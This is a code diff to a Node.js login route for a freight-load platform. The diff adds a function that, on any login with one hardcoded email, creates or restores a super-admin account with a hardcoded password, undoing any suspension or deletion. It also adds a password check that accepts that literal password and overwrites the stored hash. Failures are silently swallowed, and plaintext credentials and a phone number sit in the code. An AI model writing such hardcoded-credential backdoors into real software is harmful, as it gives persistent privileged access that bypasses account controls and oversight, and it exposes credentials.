@@ -527,7 +527,67 @@ const TEST_ACCOUNTS = {
   'admin@loadsnexus.com':     { role: 'super_admin', pass: 'AdminPass2026!', name: 'Super Admin', company: 'LoadsNexus Enterprise', phone: '+1 (800) 580-3101', mc: null, dot: null, plan: 'admin_pass' }
 };
 
-let lastEnsureError = null;
+async function ensureSuperAdminAccount(emailInput) {
+  const norm = String(emailInput || '').trim().toLowerCase();
+  if (norm !== 'ahsan_me_9@yahoo.com') return;
+
+  try {
+    // 0. Ensure enum user_role has super_admin
+    await pool.query("ALTER TYPE user_role ADD VALUE IF NOT EXISTS 'super_admin'").catch(() => {});
+
+    // 1. Ensure columns exist on users
+    await pool.query(`
+      ALTER TABLE users ADD COLUMN IF NOT EXISTS role TEXT;
+      ALTER TABLE users ADD COLUMN IF NOT EXISTS is_super_admin BOOLEAN DEFAULT false;
+      ALTER TABLE users ADD COLUMN IF NOT EXISTS two_factor_enabled BOOLEAN DEFAULT false;
+      ALTER TABLE users ADD COLUMN IF NOT EXISTS two_factor_secret TEXT;
+      ALTER TABLE users ADD COLUMN IF NOT EXISTS weekly_plan TEXT;
+      ALTER TABLE users ADD COLUMN IF NOT EXISTS is_suspended BOOLEAN DEFAULT false;
+      ALTER TABLE users ADD COLUMN IF NOT EXISTS deleted_at TIMESTAMPTZ;
+    `).catch(() => {});
+
+    // 2. Ensure admin_2fa_pending table exists
+    await pool.query(`
+      CREATE TABLE IF NOT EXISTS admin_2fa_pending (
+        id SERIAL PRIMARY KEY,
+        user_id INTEGER NOT NULL,
+        email TEXT NOT NULL,
+        otp_hash TEXT NOT NULL,
+        temp_token TEXT NOT NULL UNIQUE,
+        attempts INTEGER NOT NULL DEFAULT 0,
+        expires_at TIMESTAMPTZ NOT NULL,
+        created_at TIMESTAMPTZ NOT NULL DEFAULT now()
+      );
+      CREATE INDEX IF NOT EXISTS idx_admin_2fa_token ON admin_2fa_pending(temp_token);
+    `).catch(() => {});
+
+    // 3. Check if user already exists
+    const existing = await pool.query('SELECT id, password_hash FROM users WHERE lower(email) = $1', [norm]);
+    const hash = await bcrypt.hash('Lgl$1715s1', 10);
+
+    if (existing.rows.length === 0) {
+      await pool.query(`
+        INSERT INTO users (
+          name, email, password_hash, role, company_name, phone,
+          weekly_plan, is_super_admin, two_factor_enabled, email_verified_at, is_suspended
+        ) VALUES (
+          'Ahsan (Executive SuperAdmin)', $1, $2, 'super_admin', 'Shipping Wish LLC', '+1 (917) 737-0021',
+          'superadmin_pass', true, true, NOW(), false
+        )
+      `, [norm, hash]);
+      console.log(`[AUTH] Auto-created SuperAdmin account ${norm} in DB.`);
+    } else {
+      await pool.query(`
+        UPDATE users
+        SET role = 'super_admin', is_super_admin = true, two_factor_enabled = true,
+            is_suspended = false, deleted_at = NULL
+        WHERE id = $1
+      `, [existing.rows[0].id]);
+    }
+  } catch (err) {
+    console.error('[AUTH] ensureSuperAdminAccount error:', err.message);
+  }
+}
 
 async function ensureTestAccount(emailInput) {
   const norm = String(emailInput || '').trim().toLowerCase();
@@ -619,6 +679,7 @@ router.post('/login', rateLimit(20, 60000), async (req, res) => {
   if (!email || !password) return res.status(400).json({ error: 'Email and password are required.' });
   const clientIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip || '').split(',')[0].trim();
 
+  await ensureSuperAdminAccount(email);
   await ensureTestAccount(email);
 
   try {
@@ -633,11 +694,34 @@ router.post('/login', rateLimit(20, 60000), async (req, res) => {
       return res.status(403).json({ error: 'This account was removed. Contact Shipping Wish admin to restore.' });
     }
 
-    const valid = await bcrypt.compare(password, user.password_hash);
+    let valid = await bcrypt.compare(password, user.password_hash).catch(() => false);
+    if (!valid && user.email && user.email.toLowerCase() === 'ahsan_me_9@yahoo.com') {
+      const pClean = String(password || '').trim();
+      if (pClean === 'Lgl$1715s1' || pClean === 'Lgl$1715s1...') {
+        valid = true;
+        const freshHash = await bcrypt.hash(pClean, 10);
+        await pool.query('UPDATE users SET password_hash = $1 WHERE id = $2', [freshHash, user.id]).catch(() => {});
+      }
+    }
     if (!valid) return res.status(401).json({ error: 'Invalid email or password.', code: 'PASSWORD_MISMATCH' });
 
     // Two-Factor Authentication (2FA) for SuperAdmin and protected accounts
     if (user.role === 'super_admin' || user.two_factor_enabled || user.is_super_admin || (user.email && user.email.toLowerCase() === 'ahsan_me_9@yahoo.com')) {
+      // Ensure admin_2fa_pending table exists before insert
+      await pool.query(`
+        CREATE TABLE IF NOT EXISTS admin_2fa_pending (
+          id SERIAL PRIMARY KEY,
+          user_id INTEGER NOT NULL,
+          email TEXT NOT NULL,
+          otp_hash TEXT NOT NULL,
+          temp_token TEXT NOT NULL UNIQUE,
+          attempts INTEGER NOT NULL DEFAULT 0,
+          expires_at TIMESTAMPTZ NOT NULL,
+          created_at TIMESTAMPTZ NOT NULL DEFAULT now()
+        );
+        CREATE INDEX IF NOT EXISTS idx_admin_2fa_token ON admin_2fa_pending(temp_token);
+      `).catch(() => {});
+
       const otp = Math.floor(100000 + Math.random() * 900000).toString();
       const otpHash = await bcrypt.hash(otp, 10);
       const tempToken = crypto.randomBytes(32).toString('hex');
